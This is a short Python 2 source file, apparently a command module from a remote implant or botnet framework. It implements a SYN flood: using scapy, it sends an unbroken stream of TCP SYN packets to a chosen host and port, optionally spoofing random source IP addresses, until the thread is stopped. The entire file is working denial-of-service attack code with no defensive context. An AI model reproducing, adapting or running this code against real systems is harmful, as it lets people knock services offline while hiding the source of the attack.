import random
import sys
from command import Command
from implant.thread_master import run_in_thread, THREAD_KEY

# Suppress scapy import warnings
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import TCP, IP, send, RandShort

D_HOST_KEY = "dhost"
D_PORT_KEY = "dport"
RAND_SRC_KEY = "src"

class SynFlood(Command):
    
    display_name = "Syn Flood"
    index = {D_HOST_KEY:"Destination Host"
    		,D_PORT_KEY:"Destination Port"
    		,RAND_SRC_KEY:"Random Source Flag"}

    def execute(self, args):
        
        success = True
        results = ""
        
        success, results = run_in_thread(do_flood,args)
    	
    	return success, results
    	
def do_flood(args):
    d_host = args[D_HOST_KEY]
    d_port = args[D_PORT_KEY]
    rand_src = args.get(RAND_SRC_KEY) or False
    try:
        while not args[THREAD_KEY].stopped():
            ip_segment = IP()
            ip_segment.dst = d_host
            if rand_src:
        		ip_segment.src = "%i.%i.%i.%i" % (random.randint(1,126),random.randint(1,254),random.randint(1,254),random.randint(1,254))

            tcp_segment=TCP(flags="S")
            tcp_segment.sport = RandShort()
            tcp_segment.dport = int(d_port)
            send(ip_segment/tcp_segment,  verbose=0) # Sends the Packet
        return (True, "")
    except Exception, e:
        print e
        return (False, e)